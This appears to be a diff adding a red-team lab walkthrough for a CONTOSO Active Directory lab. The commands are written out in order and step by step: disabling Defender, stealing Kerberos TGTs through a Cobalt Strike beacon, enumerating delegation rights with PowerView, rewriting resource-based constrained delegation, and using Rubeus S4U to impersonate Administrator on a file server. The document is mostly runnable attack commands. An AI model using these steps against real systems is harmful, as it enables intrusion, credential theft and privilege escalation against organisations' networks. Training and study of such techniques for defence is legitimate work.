@@ -1,3 +1,62 @@
 issue socks command to conduct attack via SOCKS proxy
     beacon> socks 1080 socks5
-    
+
+launch proxifier and set up!
+    follow steps in socks lab
+
+disable defender
+    PS C:\WINDOWS\system32> Set-MpPreference -DisableRealtimeMonitoring $true
+
+extract the TGT of pchilds in our medium integrity beacon
+    beacon> krb_tgtdeleg
+
+now on attacker desktop, run a netonly process
+    PS C:\Users\Attacker> runas /netonly /user:CONTOSO\pchilds powershell
+
+request an LDAP service ticket using the TGT we dumped
+    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+now lets import powerview  
+    PS C:\WINDOWS\system32> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
+
+find principals with write privs on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+    PS C:\WINDOWS\system32> Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+
+we see that an SID ending in 1107 has this privilege over 5 principals
+let's query ldap to discover what the SID is
+    PS C:\WINDOWS\system32> Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
+
+it shows as the server admins group, which rsteel is part of!
+lets go back to the beacon and grab the ticket for rsteel
+    beacon> krb_triage
+    beacon> krb_dump /user:rsteel /service:krbtgt
+
+in the netonly process, purge the ldap ticket w pchilds and request new ticket for rsteel
+    PS C:\WINDOWS\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
+    PS C:\WINDOWS\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+
+now lets check for existing RBCD configs
+    Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+
+we see an existing config between lon-fs-1 and lon-ws-1, we do not want to remove this!
+let's just add wkstn since we have SYSTEM on it
+    PS C:\WINDOWS\system32> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
+    PS C:\WINDOWS\system32> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
+    PS C:\WINDOWS\system32> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
+
+verify it was added
+    PS C:\WINDOWS\system32> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+
+now go back to cobalt and dump the TGT for lon-wkstn-1
+    beacon> krb_dump /user:lon-wkstn-1$ /service:krbtgt
+
+request a usable service ticket for cifs/lon-fs-1 impersonating Administrator
+    PS C:\WINDOWS\system32>  C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
+
+now use the service ticket to interact with lon-fs-1
+    beacon> make_token CONTOSO\Administrator FakePass
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
+
+restore the RBCD config to how it was
+    PS C:\WINDOWS\system32> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
+    PS C:\WINDOWS\system32> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
